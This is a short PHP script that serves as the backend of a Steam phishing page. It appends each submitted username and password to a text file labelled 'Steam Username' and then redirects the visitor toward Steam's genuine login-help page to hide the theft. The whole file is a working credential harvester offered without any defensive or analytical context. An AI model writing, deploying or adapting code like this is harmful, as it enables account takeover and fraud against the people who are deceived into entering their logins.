<?php

file_put_contents("usernames.txt", "Steam Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://help.steampowered.com/en/wizard/HelpWithLoginInfo/
header("Location: $url");
exit();
?>